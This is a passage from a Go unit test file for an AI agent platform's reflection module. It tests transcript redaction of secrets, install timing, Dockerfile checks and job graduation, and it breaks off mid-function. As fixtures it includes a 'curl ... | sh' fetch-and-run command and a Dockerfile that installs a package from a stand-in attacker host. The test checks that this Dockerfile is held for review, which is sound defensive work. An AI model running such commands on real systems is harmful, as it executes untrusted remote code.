//go:build unit

package reflection

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"maps"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/stonith404/umpteenth/backend/internal/database"
	"github.com/stonith404/umpteenth/backend/internal/events"
	"github.com/stonith404/umpteenth/backend/internal/llm"
	"github.com/stonith404/umpteenth/backend/internal/llm/fake"
	"github.com/stonith404/umpteenth/backend/internal/playbook"
	"github.com/stonith404/umpteenth/backend/internal/reflection/reflectiondb"
	"github.com/stonith404/umpteenth/backend/internal/runner"
	"github.com/stonith404/umpteenth/backend/internal/sandbox"
	"github.com/stonith404/umpteenth/backend/internal/settings"
	"github.com/stonith404/umpteenth/backend/internal/storage"
	"github.com/stonith404/umpteenth/backend/internal/testutil"
)

func event(typ string, ms int64, payload any) reflectiondb.RunEventsRow {
	raw, _ := json.Marshal(payload)
	row := reflectiondb.RunEventsRow{Type: typ, Payload: string(raw)}
	if ms > 0 {
		row.Ms = &ms
	}
	return row
}

func TestTranscriptCondensesRedactsAndTimesInstalls(t *testing.T) {
	rows := []reflectiondb.RunEventsRow{
		event("llm.call", 900, map[string]any{"turn": 1, "text": "Installing the charting library first."}),
		event("tool.call", 0, map[string]any{"callId": "c1", "name": "bash", "args": map[string]any{"command": "pip install --user matplotlib"}}),
		event("tool.result", 14_000, map[string]any{"callId": "c1", "name": "bash", "content": "Successfully installed matplotlib", "isError": false}),
		event("tool.call", 0, map[string]any{"callId": "c2", "name": "bash", "args": map[string]any{"command": "curl -H 'Authorization: token s3cr3t-token' api"}}),
		event("tool.result", 300, map[string]any{"callId": "c2", "name": "bash", "content": strings.Repeat("x", resultHead-4) + "s3cr3t-token" + strings.Repeat("x", 5000), "isError": true}),
		event("tool.call", 0, map[string]any{"callId": "c3", "name": "remember", "args": map[string]any{"note": "matplotlib is not preinstalled"}}),
		event("finish", 0, map[string]any{"status": "success", "summary": "Rendered the chart"}),
	}
	tr := buildTranscript(rows, newRedactor(map[string]string{"GH_TOKEN": "s3cr3t-token", "SHORT": "abc"}))

	assert.Contains(t, tr.Text, "[turn 1] assistant: Installing the charting library first.")
	assert.Contains(t, tr.Text, "-> ok after 14.0s")
	assert.Contains(t, tr.Text, "[finish]")

	// Secrets are replaced by their name, also where long output is cut, and long output keeps only its beginning and end
	assert.NotContains(t, tr.Text, "s3cr")
	assert.Contains(t, tr.Text, "[secret $GH_TOKEN]")
	assert.Less(t, strings.Count(tr.Text, "x"), 2000)

	assert.Equal(t, []string{"matplotlib is not preinstalled"}, tr.Notes)
	assert.EqualValues(t, 14_000, tr.Timings.InstallMs)
	assert.Equal(t, []string{"pip install --user matplotlib"}, tr.Timings.Installs)
}

func TestTranscriptCountsRuntimeDownloadsAsInstalls(t *testing.T) {
	getNode := "import urllib.request\nurllib.request.urlretrieve('https://nodejs.org/dist/v26.0.0/node-v26.0.0-linux-x64.tar.gz', 'node.tar.gz')"
	bash := func(id, command string) reflectiondb.RunEventsRow {
		return event("tool.call", 0, map[string]any{"callId": id, "name": "bash", "args": map[string]any{"command": command}})
	}
	result := func(id string, ms int64) reflectiondb.RunEventsRow {
		return event("tool.result", ms, map[string]any{"callId": id, "content": "done", "isError": false})
	}
	rows := []reflectiondb.RunEventsRow{
		bash("c1", "python3 - <<'EOF'\n"+getNode+"\nEOF"), result("c1", 40_000),
		event("tool.call", 0, map[string]any{"callId": "c2", "name": "write_file", "args": map[string]any{"path": "/workspace/get_node.py", "content": getNode}}), result("c2", 100),
		bash("c3", "cat get_node.py"), result("c3", 100),
		bash("c4", "python3 get_node.py"), result("c4", 30_000),
		bash("c5", "cd repo && npm ci"), result("c5", 20_000),
		bash("c6", "npm install puppeteer"), result("c6", 5_000),
	}
	tr := buildTranscript(rows, newRedactor(nil))

	// Downloading a runtime, running a file that does and fetching a library count, while reading that file and a project's own dependencies don't
	assert.EqualValues(t, 75_000, tr.Timings.InstallMs)
	assert.Len(t, tr.Timings.Installs, 3)

	// A file that mentions an install counts only when a command runs it, so staging a repository's Dockerfile installs nothing
	rows = []reflectiondb.RunEventsRow{
		event("tool.call", 0, map[string]any{"callId": "c1", "name": "write_file", "args": map[string]any{"path": "repo/Dockerfile", "content": "FROM alpine\nRUN apk add --no-cache git"}}), result("c1", 100),
		bash("c2", "cd repo && git add Dockerfile && git rebase --continue"), result("c2", 2_000),
		event("tool.call", 0, map[string]any{"callId": "c3", "name": "write_file", "args": map[string]any{"path": "/workspace/get_node.sh", "content": "curl -fsSL https://example.com/install.sh | sh"}}), result("c3", 100),
		bash("c4", "bash get_node.sh"), result("c4", 10_000),
		bash("c5", "chmod +x get_node.sh && ./get_node.sh"), result("c5", 20_000),
	}
	tr = buildTranscript(rows, newRedactor(nil))
	assert.Equal(t, []string{"bash get_node.sh", "chmod +x get_node.sh && ./get_node.sh"}, tr.Timings.Installs)
	assert.EqualValues(t, 30_000, tr.Timings.InstallMs)
}

func TestEnvironmentSectionMovesInstallsRightAway(t *testing.T) {
	const moveNow = "Move the software this run installed into the Dockerfile with set_dockerfile"

	// One run that installed something by hand is enough, since the next run would repeat it
	timings := Timings{InstallMs: 2_000, Installs: []string{"pip install --user requests"}}
	installed := input{ImageBuilds: true, Transcript: transcript{Timings: timings}}.userMessage()
	assert.Contains(t, installed, moveNow)
	assert.Contains(t, installed, "2.0s installing software by hand (pip install --user requests)")
	assert.NotContains(t, input{ImageBuilds: true}.userMessage(), moveNow)

	// A playbook that already installs software in a script is pointed out too
	installNode := playbook.Script{Name: "install_node26", Content: "#!/usr/bin/env python3\nurl = 'https://nodejs.org/dist/v26.0.0/node-v26.0.0-linux-x64.tar.gz'"}
	msg := input{ImageBuilds: true, Playbook: playbook.Content{Toolkit: []playbook.Script{installNode}}}.userMessage()
	assert.Contains(t, msg, "The playbook installs software in every run, in the toolkit script install_node26 (")

	// Without image builds nothing can move into the Dockerfile, so reflection is told to keep installs where they are
	fetch := candidate{Name: "fetch.py", Content: "import subprocess\nsubprocess.run('pip install requests', shell=True)"}
	noBuilds := input{Transcript: transcript{Timings: timings}, Playbook: playbook.Content{Toolkit: []playbook.Script{installNode}}, Candidates: []candidate{fetch}}.userMessage()
	assert.Contains(t, noBuilds, "cannot build images, so never use set_dockerfile")
	assert.NotContains(t, noBuilds, moveNow)
	assert.NotContains(t, noBuilds, "into the Dockerfile with set_dockerfile")
	assert.NotContains(t, noBuilds, "put that into the Dockerfile")
}

func TestRepairAndGraduationAskForRunTimeData(t *testing.T) {
	assert.Contains(t, input{Graduation: graduation{FellBack: "a check failed"}}.userMessage(), "instead of adding this run's data to a script")
	assert.Contains(t, input{Graduation: graduation{Eligible: true}}.userMessage(), "Main must work on whatever items a run finds")

	// A candidate that installs software is flagged before reflection promotes it as it is
	msg := input{ImageBuilds: true, Candidates: []candidate{{Name: "fetch.py", Content: "import subprocess\nsubprocess.run('pip install requests', shell=True)"}}}.userMessage()
	assert.Contains(t, msg, "It installs software (subprocess.run('pip install requests', shell=True))")

	// The agent's own notes are know-how, never requirements
	notes := input{Transcript: transcript{Notes: []string{"Run the type check before committing"}}}.userMessage()
	assert.Contains(t, notes, "keep only what is know-how")

	// Additional instructions explain what one run did differently, and are marked as applying to it alone
	instructed := input{Run: runFacts{Instructions: "Only handle Renovate PRs this time"}}.userMessage()
	assert.Contains(t, instructed, "Additional instructions for this run only: Only handle Renovate PRs this time")
}

type fakeJobs struct{ cfg runner.JobConfig }

func (f fakeJobs) LoadForRun(context.Context, string, string, int64) (runner.JobConfig, error) {
	return f.cfg, nil
}

type fakeModels struct{ provider llm.Provider }

func (f fakeModels) Resolve(context.Context, string, string) (llm.Provider, runner.Model, error) {
	return f.provider, runner.Model{ID: "m1", Name: "reflector", Price: llm.Price{In: 1_000_000, Out: 2_000_000}}, nil
}

type fakeSettings struct{}

func (fakeSettings) Get(context.Context, string) (settings.WorkspaceSettings, error) {
	return settings.WorkspaceSettings{}, nil
}

type notDemoted struct{}

func (notDemoted) Demoted(context.Context, string, string) (bool, error) { return false, nil }

// newModule builds a reflection module around a scripted model and the job configuration its runs load
func newModule(db *database.DB, pb *playbook.Module, provider llm.Provider, job runner.JobConfig) *Module {
	return &Module{
		deps: Dependencies{
			DB: db, Bus: events.NewLocalBus(), Storage: storage.NewDatabaseStorage(db), Playbook: pb, Settings: fakeSettings{},
			Models: fakeModels{provider}, Jobs: fakeJobs{job}, Demotion: notDemoted{},
		},
		queries: reflectiondb.New(db),
	}
}

// seedRun adds a finished run whose reflection is pending
func seedRun(t *testing.T, db *database.DB, wid, jobID string, number int64, mode string, playbookVersion int64) string {
	t.Helper()
	id := database.NewID()
	testutil.Exec(t, db, `INSERT INTO runs (id, workspace_id, job_id, number, status, mode, trigger, playbook_version, queued_at, finished_at, turns, reflection, reflection_requested_at)
		VALUES ($1, $2, $3, $4, 'succeeded', $5, 'manual', $6, $7, $7, 3, 'pending', $7)`, id, wid, jobID, number, mode, playbookVersion, database.Now())
	return id
}

// reflectOn reflects on a run the way the taskpool handler does
func reflectOn(t *testing.T, m *Module, wid, runID string) result {
	t.Helper()
	run, err := m.queries.GetRun(t.Context(), reflectiondb.GetRunParams{WorkspaceID: wid, ID: runID})
	require.NoError(t, err)
	res, err := m.reflect(t.Context(), run)
	require.NoError(t, err)
	return res
}

// submit scripts one structured reflection answer, which the fake provider returns as native JSON output
func submit(t *testing.T, ans map[string]any) fake.ScriptedResponse {
	t.Helper()
	raw, err := json.Marshal(ans)
	require.NoError(t, err)
	return fake.ScriptedResponse{Text: string(raw), Usage: llm.Usage{Input: 1000, Output: 500}}
}

func op(kind string, fields map[string]any) map[string]any {
	o := map[string]any{"op": kind, "rationale": "because", "id": nil, "kind": nil, "text": nil, "when": nil, "name": nil, "content": nil}
	maps.Copy(o, fields)
	return o
}

func TestReflectAppliesOperationsAsANewVersion(t *testing.T) {
	ctx := t.Context()
	db := testutil.NewDatabaseForTest(t)
	wid := testutil.SeedWorkspace(t, db)
	jobID := testutil.SeedJob(t, db, wid, "skip")
	pb := playbook.New(playbook.Dependencies{DB: db})

	// An earlier version exists, with a learning the run relied on
	_, err := pb.Save(ctx, wid, jobID, playbook.Content{Learnings: []playbook.Learning{{ID: "L1", Kind: "fact", Text: "The API pages at 100", Status: "active"}}}, playbook.VersionMeta{Author: playbook.AuthorUser})
	require.NoError(t, err)

	// The run left a candidate script and a transcript that mentions a secret
	runID := seedRun(t, db, wid, jobID, 1, runner.ModeAssisted, 1)
	testutil.Exec(t, db, `INSERT INTO run_events (run_id, seq, ts, type, payload) VALUES ($1, 1, 1, 'tool.call', $2)`,
		runID, `{"callId":"c1","name":"bash","args":{"command":"echo topsecret-value"}}`)
	candidate := "#!/usr/bin/env python3\n# ump:name top_stories\n# ump:description Print the top stories as JSON\n# ump:args {\"count\":\"integer?\"}\nprint('[]')"
	require.NoError(t, storage.NewDatabaseStorage(db).Save(ctx, "runs/"+runID+"/candidates/top_stories.py", strings.NewReader(candidate)))

	// The first answer updates a learning that doesn't exist, so reflection asks again with the reason
	provider := fake.New()
	provider.Enqueue(
		submit(t, map[string]any{"summary": "first try", "usedLearnings": []string{"L1"}, "ops": []any{
			op(playbook.OpUpdateLearning, map[string]any{"id": "L7", "text": "x"}),
		}}),
		submit(t, map[string]any{"summary": "Promoted the story script", "usedLearnings": []string{"L1", "L99"}, "ops": []any{
			op(playbook.OpAddLearning, map[string]any{"kind": "edge_case", "text": "Stories without a URL are Ask HN posts"}),
			op(playbook.OpUpsertScript, map[string]any{"content": candidate}),
			op(playbook.OpSetDockerfile, map[string]any{"content": "FROM docker.io/other/image\nRUN true"}),
		}}),
	)

	m := newModule(db, pb, provider, runner.JobConfig{Instruction: "Summarize the top stories", BaseImage: "sandbox:latest", ModelID: "m1", Env: map[string]string{"API_KEY": "topsecret-value"}})
	res := reflectOn(t, m, wid, runID)

	// The model saw the candidate and never the secret, and the second request explained the rejection
	requests := provider.Requests()
	require.Len(t, requests, 2)
	first := requests[0].Messages[0].Text()
	assert.Contains(t, first, "# ump:name top_stories")
	assert.NotContains(t, first, "topsecret-value")
	assert.Contains(t, requests[1].Messages[len(requests[1].Messages)-1].Text(), "there is no learning L7")

	// Applied operations became version 2, and the new base image was held back for review
	require.NotNil(t, res.Version)
	assert.EqualValues(t, 2, *res.Version)
	assert.Equal(t, "Promoted the story script", res.Summary)
	require.Len(t, res.Ops, 3)
	assert.Equal(t, []string{playbook.OpApplied, playbook.OpApplied, playbook.OpHeld}, []string{res.Ops[0].Status, res.Ops[1].Status, res.Ops[2].Status})
	assert.Equal(t, int64(2*(1000+1000)), res.Cost)
	assert.Equal(t, int64(2*(1000+500)), res.Tokens)

	version, content, err := pb.Current(ctx, jobID)
	require.NoError(t, err)
	assert.EqualValues(t, 2, version)
	require.Len(t, content.Learnings, 2)
	assert.Equal(t, "L2", content.Learnings[1].ID)
	require.Len(t, content.Toolkit, 1)
	assert.Equal(t, "top_stories", content.Toolkit[0].Name)
	assert.Equal(t, []string{runID}, content.Toolkit[0].Sources)
	assert.Nil(t, content.Dockerfile)

	// Only the cited learning that exists gets a hit
	assert.Equal(t, 1, content.Learnings[0].Hits)
}

// fakeImages fails builds of Dockerfiles that use pip, which the default sandbox image doesn't have
type fakeImages struct{ built []string }

func (f *fakeImages) Verify(_ context.Context, _ string, dockerfile string) error {
	f.built = append(f.built, dockerfile)
	if strings.Contains(dockerfile, "pip install --user") {
		return errors.New("the image build failed\n/bin/sh: 1: pip: not found")
	}
	return nil
}

func TestReflectOnlyAppliesADockerfileThatBuilds(t *testing.T) {
	ctx := t.Context()
	db := testutil.NewDatabaseForTest(t)
	wid := testutil.SeedWorkspace(t, db)
	jobID := testutil.SeedJob(t, db, wid, "skip")
	pb := playbook.New(playbook.Dependencies{DB: db})
	runID := seedRun(t, db, wid, jobID, 1, runner.ModeExplore, 0)

	// The first Dockerfile doesn't build, the corrected one does
	broken := "FROM sandbox:latest\nRUN pip install --user matplotlib"
	fixed := "FROM sandbox:latest\nRUN uv pip install --system matplotlib"
	provider := fake.New()
	provider.Enqueue(
		submit(t, map[string]any{"summary": "Moved matplotlib into the image", "usedLearnings": []string{}, "ops": []any{
			op(playbook.OpSetDockerfile, map[string]any{"content": broken}),
			op(playbook.OpAddLearning, map[string]any{"text": "matplotlib is preinstalled"}),
		}}),
		submit(t, map[string]any{"summary": "Moved matplotlib into the image", "usedLearnings": []string{}, "ops": []any{
			op(playbook.OpSetDockerfile, map[string]any{"content": fixed}),
			op(playbook.OpAddLearning, map[string]any{"text": "matplotlib is preinstalled"}),
		}}),
	)
	images := &fakeImages{}
	m := newModule(db, pb, provider, runner.JobConfig{Instruction: "Plot the data", BaseImage: "sandbox:latest", Network: sandbox.NetworkInternet, ModelID: "m1"})
	m.deps.Images = images
	res := reflectOn(t, m, wid, runID)

	// The model learned why the build failed, and only the Dockerfile that built became the job's environment
	requests := provider.Requests()
	require.Len(t, requests, 2)
	assert.Contains(t, requests[1].Messages[len(requests[1].Messages)-1].Text(), "pip: not found")
	assert.Equal(t, []string{broken, fixed}, images.built)
	require.NotNil(t, res.Version)
	_, content, err := pb.Current(ctx, jobID)
	require.NoError(t, err)
	require.NotNil(t, content.Dockerfile)
	assert.Equal(t, fixed, *content.Dockerfile)

	// When the second Dockerfile doesn't build either, the rest of the answer still applies but the environment stays as it was
	still := map[string]any{"summary": "Tried pip again", "usedLearnings": []string{}, "ops": []any{
		op(playbook.OpSetDockerfile, map[string]any{"content": broken}),
		op(playbook.OpAddLearning, map[string]any{"text": "Plots need a title"}),
	}}
	provider.Enqueue(submit(t, still), submit(t, still))
	res = reflectOn(t, m, wid, seedRun(t, db, wid, jobID, 2, runner.ModeAssisted, 1))
	assert.Equal(t, playbook.OpRejected, res.Ops[0].Status)
	assert.Contains(t, res.Ops[0].Reason, "the image did not build")
	assert.Equal(t, playbook.OpApplied, res.Ops[1].Status)
	_, content, err = pb.Current(ctx, jobID)
	require.NoError(t, err)
	assert.Equal(t, fixed, *content.Dockerfile)
	assert.Len(t, content.Learnings, 2)
}

func TestReflectNeverBuildsADockerfileOfAJobWithoutInternet(t *testing.T) {
	ctx := t.Context()
	db := testutil.NewDatabaseForTest(t)
	wid := testutil.SeedWorkspace(t, db)
	jobID := testutil.SeedJob(t, db, wid, "skip")
	pb := playbook.New(playbook.Dependencies{DB: db})
	runID := seedRun(t, db, wid, jobID, 1, runner.ModeExplore, 0)

	// The Dockerfile keeps the job's base image, but its build would fetch from a URL the job itself can't reach
	dockerfile := "FROM sandbox:latest\nRUN uv pip install --system https://attacker.example/x-1.0-py3-none-any.whl"
	provider := fake.New()
	provider.Enqueue(submit(t, map[string]any{"summary": "Moved the install into the image", "usedLearnings": []string{}, "ops": []any{
		op(playbook.OpSetDockerfile, map[string]any{"content": dockerfile}),
		op(playbook.OpAddLearning, map[string]any{"text": "The package is preinstalled"}),
	}}))
	images := &fakeImages{}
	m := newModule(db, pb, provider, runner.JobConfig{Instruction: "Plot the data", BaseImage: "sandbox:latest", Network: sandbox.NetworkNone, ModelID: "m1"})
	m.deps.Images = images
	res := reflectOn(t, m, wid, runID)

	// The Dockerfile waits for a person without ever being built, and the rest of the answer still applies
	assert.Empty(t, images.built)
	require.Len(t, res.Ops, 2)
	assert.Equal(t, playbook.OpHeld, res.Ops[0].Status)
	assert.Contains(t, res.Ops[0].Flags, "image builds reach the internet, which this job's network setting forbids")
	assert.Equal(t, playbook.OpApplied, res.Ops[1].Status)
	require.NotNil(t, res.Version)
	_, content, err := pb.Current(ctx, jobID)
	require.NoError(t, err)
	assert.Nil(t, content.Dockerfile)
	assert.Len(t, content.Learnings, 1)
}

func TestGraduationCriteria(t *testing.T) {
	calls := func(names ...string) []reflectiondb.RunEventsRow {
		var rows []reflectiondb.RunEventsRow
		for i, n := range names {
			args := map[string]any{}
			name := n
			if cmd, ok := strings.CutPrefix(n, "bash:"); ok {
				name, args = "bash", map[string]any{"command": cmd}
			}
			rows = append(rows, event("tool.call", 0, map[string]any{"callId": string(rune('a' + i)), "name": name, "args": args}))
		}
		return rows
	}
	assisted := func(number int64, names ...string) runPattern {
		return patternOf(number, runner.StatusSucceeded, runner.ModeAssisted, calls(names...))
	}
	// quiet ends the calls with a finish that says the run found nothing to do
	quiet := func(names ...string) []reflectiondb.RunEventsRow {
		return append(calls(names...), event("finish", 0, map[string]any{"status": "success", "summary": "Nothing new", "nothingToDo": true}))
	}
	idle := func(number int64, names ...string) runPattern {
		return patternOf(number, runner.StatusSucceeded, runner.ModeAssisted, quiet(names...))
	}
	// instructed is a run that had additional instructions for it alone
	instructed := func(number int64, names ...string) runPattern {
		p := assisted(number, names...)
		p.Instructed = true
		return p
	}

	// Three Assisted runs with the same toolkit and MCP steps qualify, reading files doesn't count against them
	ok, reason, done := qualifies([]runPattern{
		assisted(5, "bash:cat /ump/input.json | jq .", "toolkit__fetch", "slack__post", "finish"),
		assisted(4, "toolkit__fetch", "bash:ls /ump/outputs", "slack__post", "finish"),
		assisted(3, "toolkit__fetch", "slack__post", "remember", "finish"),
	})
	assert.True(t, ok, reason)
	assert.True(t, done)

	// Runs that found nothing to do between the working runs neither count toward the three nor break the streak
	ok, reason, done = qualifies([]runPattern{
		assisted(7, "toolkit__fetch", "toolkit__send"),
		idle(6, "toolkit__fetch"),
		assisted(5, "toolkit__fetch", "toolkit__send"),
		idle(4),
		assisted(3, "toolkit__fetch", "toolkit__send"),
	})
	assert.True(t, ok, reason)
	assert.True(t, done)

	// A run with additional instructions did something else than the job as it is, so it is passed over like an idle run
	ok, reason, done = qualifies([]runPattern{
		assisted(6, "toolkit__fetch", "toolkit__send"),
		instructed(5, "toolkit__fetch"),
		assisted(4, "toolkit__fetch", "toolkit__send"),
		assisted(3, "toolkit__fetch", "toolkit__send"),
	})
	assert.True(t, ok, reason)
	assert.True(t, done)

	cases := map[string]struct {
		patterns []runPattern
		// done tells whether older runs could still change the outcome
		done bool
		// reason is a part the reason must contain
		reason string
	}{
		"needs 3":            {patterns: []runPattern{assisted(2, "toolkit__fetch"), assisted(1, "toolkit__fetch")}},
		"not Assisted":       {patterns: []runPattern{assisted(5, "toolkit__fetch"), assisted(4, "toolkit__fetch"), patternOf(3, runner.StatusSucceeded, runner.ModeExplore, calls("toolkit__fetch"))}, done: true},
		"failed":             {patterns: []runPattern{assisted(5, "toolkit__fetch"), patternOf(4, runner.StatusFailed, runner.ModeAssisted, calls("toolkit__fetch")), assisted(3, "toolkit__fetch")}, done: true},
		"too much ad-hoc":    {patterns: []runPattern{assisted(5, "toolkit__fetch", "bash:pip install x", "bash:python3 a.py", "bash:echo hi > f"), assisted(4, "toolkit__fetch"), assisted(3, "toolkit__fetch")}, done: true},
		"different sequence": {patterns: []runPattern{assisted(5, "toolkit__fetch"), assisted(4, "toolkit__fetch", "toolkit__format"), assisted(3, "toolkit__fetch")}, done: true},
		// Quiet days alone never graduate a job, since main would be written from a run that skipped the work
		"only runs with nothing to do": {patterns: []runPattern{idle(7, "toolkit__fetch"), idle(6, "toolkit__fetch"), idle(5, "toolkit__fetch")}, done: true, reason: "#7 found nothing to do"},
		"newest with nothing to do":    {patterns: []runPattern{idle(8), assisted(7, "toolkit__fetch"), assisted(6, "toolkit__fetch"), assisted(5, "toolkit__fetch")}, done: true, reason: "#8 found nothing to do"},
		"too few working runs":         {patterns: []runPattern{assisted(5, "toolkit__fetch"), idle(4), assisted(3, "toolkit__fetch")}, reason: "1 of its latest runs found nothing to do"},
		"newest with instructions":     {patterns: []runPattern{instructed(8, "toolkit__fetch"), assisted(7, "toolkit__fetch"), assisted(6, "toolkit__fetch"), assisted(5, "toolkit__fetch")}, done: true, reason: "#8 had additional instructions"},
		"failed with nothing to do":    {patterns: []runPattern{assisted(5, "toolkit__fetch"), patternOf(4, runner.StatusFailed, runner.ModeAssisted, quiet()), assisted(3, "toolkit__fetch"), assisted(2, "toolkit__fetch")}, done: true, reason: "#4 was a failed"},
	}
	for name, c := range cases {
		ok, reason, done := qualifies(c.patterns)
		assert.False(t, ok, name)
		assert.NotEmpty(t, reason, name)
		assert.Equal(t, c.done, done, name)
		assert.Contains(t, reason, c.reason, name)
	}

	// Only the finish flag marks a run that found nothing to do, and it leaves the steps the run took as they are
	unflagged := patternOf(3, runner.StatusSucceeded, runner.ModeAssisted, append(calls("toolkit__fetch"), event("finish", 0, map[string]any{"status": "success", "summary": "Sent it"})))
	assert.False(t, unflagged.Idle)
	assert.False(t, assisted(3, "toolkit__fetch").Idle)
	flagged := idle(3, "toolkit__fetch")
	assert.True(t, flagged.Idle)
	assert.Equal(t, unflagged.Sequence, flagged.Sequence)

	assert.True(t, readOnlyCommand("cat a.txt | grep x && wc -l b"))
	assert.False(t, readOnlyCommand("cat a > b"))
	assert.False(t, readOnlyCommand("ls; python3 x.py"))
}

func TestRedactorCatchesJSONEscapedSecrets(t *testing.T) {
	secret := `p&ss<w"rd\123` // #nosec G101 -- a fake secret the redaction must catch
	redact := newRedactor(map[string]string{"API_KEY": secret})

	// Payloads reach the transcript as JSON, where the encoder escapes the secret's special characters
	raw, err := json.Marshal(map[string]string{"command": "curl -H 'Authorization: " + secret + "'"})
	require.NoError(t, err)
	out := redact(string(raw))
	require.NotContains(t, out, "ss\\u003cw")
	require.NotContains(t, out, `w\"rd`)
	require.Contains(t, out, "[secret $API_KEY]")
}

func TestGraduationIsJudgedOnTheLatestRuns(t *testing.T) {
	ctx := t.Context()
	db := testutil.NewDatabaseForTest(t)
	wid := testutil.SeedWorkspace(t, db)
	jobID := testutil.SeedJob(t, db, wid, "skip")
	m := &Module{queries: reflectiondb.New(db)}

	// Runs 1 to 3 qualify on their own, and run 4 failed after them
	seed := func(number int64, status, mode string) string {
		id := database.NewID()
		testutil.Exec(t, db, `INSERT INTO runs (id, workspace_id, job_id, number, status, mode, trigger, playbook_version, queued_at) VALUES ($1, $2, $3, $4, $5, $6, 'manual', 0, $7)`,
			id, wid, jobID, number, status, mode, database.Now())
		testutil.Exec(t, db, `INSERT INTO run_events (run_id, seq, ts, type, payload) VALUES ($1, 1, 1, 'tool.call', '{"callId":"a","name":"toolkit__fetch","args":{}}')`, id)
		return id
	}
	var ids []string
	for n := int64(1); n <= 3; n++ {
		ids = append(ids, seed(n, runner.StatusSucceeded, runner.ModeAssisted))
	}
	check := func(id string) graduation {
		run, err := m.queries.GetRun(ctx, reflectiondb.GetRunParams{WorkspaceID: wid, ID: id})
		require.NoError(t, err)
		runEvents, err := m.queries.RunEvents(ctx, id)
		require.NoError(t, err)
		g, err := m.checkGraduation(ctx, run, runEvents, playbook.Content{}, false, newRedactor(nil))
		require.NoError(t, err)
		return g
	}
	require.True(t, check(ids[2]).Eligible)

	// Learning from run 3 again once run 4 failed must not graduate the job on the old history
	seed(4, runner.StatusFailed, runner.ModeAssisted)
	g := check(ids[2])
	assert.False(t, g.Eligible)
	assert.Contains(t, g.Reason, "#4")
}

func TestGraduationLooksPastRunsWithNothingToDo(t *testing.T) {
	ctx := t.Context()
	db := testutil.NewDatabaseForTest(t)
	wid := testutil.SeedWorkspace(t, db)
	jobID := testutil.SeedJob(t, db, wid, "skip")
	m := &Module{queries: reflectiondb.New(db)}

	// Every run fetches, and the ones that found nothing to do say so when they finish
	seed := func(number int64, idle bool, summary, outputs string) string {
		id := database.NewID()
		testutil.Exec(t, db, `INSERT INTO runs (id, workspace_id, job_id, number, status, mode, trigger, playbook_version, queued_at, summary, outputs) VALUES ($1, $2, $3, $4, $5, $6, 'manual', 0, $7, $8, $9)`,
			id, wid, jobID, number, runner.StatusSucceeded, runner.ModeAssisted, database.Now(), summary, outputs)
		finish, err := json.Marshal(map[string]any{"status": "success", "summary": summary, "nothingToDo": idle})
		require.NoError(t, err)
		testutil.Exec(t, db, `INSERT INTO run_events (run_id, seq, ts, type, payload) VALUES ($1, 1, 1, 'tool.call', '{"callId":"a","name":"toolkit__fetch","args":{}}'), ($1, 2, 2, 'finish', $2)`, id, string(finish))
		return id
	}
	check := func(id string) graduation {
		run, err := m.queries.GetRun(ctx, reflectiondb.GetRunParams{WorkspaceID: wid, ID: id})
		require.NoError(t, err)
		runEvents, err := m.queries.RunEvents(ctx, id)
		require.NoError(t, err)
		g, err := m.checkGraduation(ctx, run, runEvents, playbook.Content{}, false, newRedactor(map[string]string{"TOKEN": "s3cr3t-value"}))
		require.NoError(t, err)
		return g
	}
	seed(1, false, "Sent the summary of 1 notification", "{}")
	seed(2, true, "No new notifications", "{}")
	seed(3, false, "Sent the summary of 2 notifications", `{"count":2}`)
	seed(4, true, "No new notifications", "{}")
	latest := seed(5, false, "Sent the summary of 3 notifications with s3cr3t-value", `{"count":3}`)

	// The three runs that sent a summary qualify, and the quiet runs between them are named for main's quiet path
	g := check(latest)
	require.True(t, g.Eligible, g.Reason)
	assert.Equal(t, []string{"toolkit__fetch"}, g.Sequence)
	assert.Equal(t, []int64{4, 2}, g.Idle)
	numbers := make([]int64, len(g.Runs))
	for i, r := range g.Runs {
		numbers[i] = r.Number
	}
	assert.Equal(t, []int64{5, 3, 1}, numbers)

	// What the runs reported reaches the prompt, with the job's secrets redacted
	assert.Contains(t, g.Runs[0].Summary, "[secret $TOKEN]")
	assert.NotContains(t, g.Runs[0].Summary, "s3cr3t")
	assert.Equal(t, `{"count":2}`, g.Runs[1].Outputs)

	// A newer run that found nothing to do holds graduation back until a run does the work again
	g = check(seed(6, true, "No new notifications", "{}"))
	assert.False(t, g.Eligible)
	assert.Contains(t, g.Reason, "#6")
}

func TestGraduationPromptAsksForEveryStep(t *testing.T) {
	in := input{
		Instruction: "Check notifications. If there were any notifications send a summary email",
		SideEffects: []string{"Sends a summary email"},
		Graduation: graduation{
			Eligible: true,
			Sequence: []string{"toolkit__fetch", "toolkit__send"},
			Runs:     []runPattern{{Number: 7, Summary: "Sent the summary of 2 notifications"}, {Number: 5, Summary: "Sent the summary of 1 notification", Outputs: `{"count":1}`}},
			Idle:     []int64{6},
		},
	}
	msg := in.userMessage()
	assert.Contains(t, msg, "- side effect: Sends a summary email")
	assert.Contains(t, msg, "runs #7 and #5 succeeded")
	assert.Contains(t, msg, "#7: Sent the summary")
	assert.Contains(t, msg, `outputs: {"count":1}`)
	assert.Contains(t, msg, "toolkit__fetch → toolkit__send")
	assert.Contains(t, msg, "Runs #6 in between found nothing to do")
	assert.Contains(t, msg, "including conditional ones none of these runs reached")
	assert.Contains(t, msg, "Not graduating:")

	// Without quiet runs in the streak, the prompt doesn't mention them
	in.Graduation.Idle = nil
	assert.NotContains(t, in.userMessage(), "in between found nothing to do")

	assert.Equal(t, "#7, #5 and #3", numberList([]int64{7, 5, 3}))
	assert.Equal(t, "#7", numberList([]int64{7}))
}

func TestReflectionKnowsARunFoundNothingToDo(t *testing.T) {
	rows := []reflectiondb.RunEventsRow{
		event("tool.call", 0, map[string]any{"callId": "c1", "name": "toolkit__fetch", "args": map[string]any{}}),
		event("finish", 0, map[string]any{"status": "success", "summary": "No new notifications", "nothingToDo": true}),
	}
	tr := buildTranscript(rows, newRedactor(nil))
	assert.True(t, tr.NothingToDo)
	assert.Contains(t, input{Run: runFacts{NothingToDo: tr.NothingToDo}}.userMessage(), "found nothing to do in this run")

	// A finish without the flag is a run that did the work
	tr = buildTranscript([]reflectiondb.RunEventsRow{rows[0], event("finish", 0, map[string]any{"status": "success", "summary": "Sent the summary"})}, newRedactor(nil))
	assert.False(t, tr.NothingToDo)
	assert.NotContains(t, input{}.userMessage(), "found nothing to do in this run")
}

func TestAStaleReflectionOnlyAddsItsCostAndTokens(t *testing.T) {
	ctx := t.Context()
	db := testutil.NewDatabaseForTest(t)
	wid := testutil.SeedWorkspace(t, db)
	jobID := testutil.SeedJob(t, db, wid, "skip")
